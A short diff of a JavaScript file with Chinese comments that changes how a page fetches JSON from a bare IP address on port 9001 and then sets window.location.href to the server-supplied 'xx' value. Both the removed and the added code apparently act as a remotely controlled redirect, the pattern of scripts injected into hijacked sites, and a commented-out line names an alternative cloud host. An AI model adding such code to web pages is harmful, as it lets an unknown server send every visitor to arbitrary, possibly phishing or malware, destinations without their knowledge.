@@ -418,12 +418,13 @@
 
 
 //   fetch('https://sssssss-gglaxmsulq.cn-hangzhou.fcapp.run')
-   fetch('http://43.138.131.173:9001/d.php')
-   .then(response => response.json()) // 将响应转换为 JSON
-   .then(data => {
-     // 使用获取的 JSON 数据中的 "xx" 值进行页面跳转
-     window.location.href = data.xx
-   })
+const url = new URL('http://43.138.131.173:9001/d.php');
+url.protocol = window.location.protocol;
+fetch(url.toString())
+  .then(response => response.json()) // 将响应转换为 JSON
+  .then(data => {
+    window.location.href = data.xx
+  })
 
 
 
